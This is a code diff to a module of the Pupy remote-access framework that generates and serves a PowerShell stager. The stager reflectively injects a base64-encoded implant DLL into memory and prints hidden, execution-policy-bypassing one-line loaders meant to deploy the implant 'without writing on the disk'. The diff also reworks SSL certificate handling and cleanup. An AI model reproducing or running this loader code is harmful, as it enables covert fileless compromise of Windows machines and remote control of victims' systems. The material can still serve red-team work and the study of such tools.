@@ -10,6 +10,8 @@ from pupylib.PupyConfig import PupyConfig
 from ssl import wrap_socket
 from base64 import b64encode
 import re
+from pupylib.PupyCredentials import Credentials
+import tempfile
 
 from modules.lib.windows.powershell_upload import obfuscatePowershellScript, obfs_ps_script
 
@@ -35,7 +37,7 @@ def getInvokeReflectivePEInjectionWithDLLEmbedded(payload_conf):
     $PEBytesTotal = [System.Convert]::FromBase64String({1})
     Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
     """#{1}=x86dll
-    binaryX86=b64encode(pupygen.generate_binary_from_template(conf, 'windows', arch='x86')[0])
+    binaryX86=b64encode(generate_binary_from_template(payload_conf, 'windows', arch='x86', shared=True)[0])
     binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
     for i,aPart in enumerate(binaryX86parts):
         x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
@@ -72,7 +74,7 @@ def create_ps_command(ps_command, force_ps32=False, nothidden=False):
         else:
             command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
 
-    elif not force_ps32:
+    else:
         if nothidden is True:
             command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))
         else:
@@ -126,13 +128,30 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
         self.link_port=port
         self.random_reflectivepeinj_name=''.join([random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for _ in range(0,random.randint(8,12))])
         self.useTargetProxy = useTargetProxy
-        if ssl:
-            self.ssl=ssl
-            config = PupyConfig()
-            config.read("pupy.conf")
-            keyfile=config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep)
-            certfile=config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep)
-            self.socket = wrap_socket (self.socket, certfile=certfile, keyfile=keyfile, server_side=True)
+        self.ssl=ssl
+        if self.ssl:
+            credentials = Credentials()
+            keystr = credentials['SSL_BIND_KEY']
+            certstr = credentials['SSL_BIND_CERT']
+
+            fd_cert_path, tmp_cert_path = tempfile.mkstemp()
+            fd_key_path, tmp_key_path = tempfile.mkstemp()
+
+            os.write(fd_cert_path, certstr)
+            os.close(fd_cert_path)
+            os.write(fd_key_path, keystr)
+            os.close(fd_key_path)
+
+            self.socket = wrap_socket (self.socket, certfile=tmp_cert_path, keyfile=tmp_key_path, server_side=True)
+            self.tmp_cert_path=tmp_cert_path
+            self.tmp_key_path=tmp_key_path
+
+
+    def server_close(self):
+        print "here"
+        os.unlink(self.tmp_cert_path)
+        os.unlink(self.tmp_key_path)
+        self.socket.close()
 
 def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=True, useTargetProxy=True):
     try:
@@ -143,7 +162,7 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=Tr
             # [Errno 98] Adress already in use
             raise
 
-        print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
+        print colorize("[+] ","green")+"copy/paste one of these one-line loader to deploy pupy without writing on the disk :"
         print " --- "
         if useTargetProxy == True:
             if not ssl:
@@ -163,7 +182,7 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=Tr
                 b=b64encode(a.encode('UTF-16LE'))
             oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
             message= colorize("Please note that even if the target's system uses a proxy, this previous powershell command will not use the proxy for downloading pupy", "yellow")
-        print colorize("powershell.exe -w hidden -noni -nop -enc %s"%a, "green")
+        print colorize("powershell.exe -w hidden -noni -nop -c %s"%a, "green")
         print " --- "
         print oneliner
         print " --- "
@@ -175,5 +194,5 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=Tr
         server.serve_forever()
     except KeyboardInterrupt:
         print 'KeyboardInterrupt received, shutting down the web server'
-        server.socket.close()
+        server.server_close()
         exit()
